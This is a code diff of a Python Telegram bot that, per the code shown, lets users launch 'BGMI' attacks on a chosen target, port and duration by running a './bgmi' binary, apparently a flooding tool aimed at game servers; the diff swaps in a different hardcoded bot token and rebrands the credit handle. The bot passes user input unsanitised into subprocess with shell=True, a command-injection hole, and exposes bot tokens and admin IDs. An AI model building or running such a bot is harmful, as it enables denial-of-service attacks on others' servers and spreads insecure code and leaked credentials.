@@ -8,7 +8,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7223592524:AAEnoHb8qMGA97jxLz31cxFyqGylerlbnxU')
+bot = telebot.TeleBot('7244429853:AAFD_sdfSY5gwGnj5JxmNvVE_dqeKtM7OIg')
 
 # Admin user IDs
 admin_id = {"2111548216", "6682104026", "1048241028"}
@@ -204,7 +204,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🚀\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔗𝐏𝐨𝐫𝐭: {port}\n⏰𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@Psycho_Assistant"
+    response = f"🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🚀\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔗𝐏𝐨𝐫𝐭: {port}\n⏰𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@dakkucheats"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -240,7 +240,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
-                response = f"✅BGMI ATTACK FINISHED✅ \nTarget: {target} Port: {port} Time: {time}\n@@Psycho_Assistant"
+                response = f"✅BGMI ATTACK FINISHED✅ \nTarget: {target} Port: {port} Time: {time}\n@dakkucheats"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
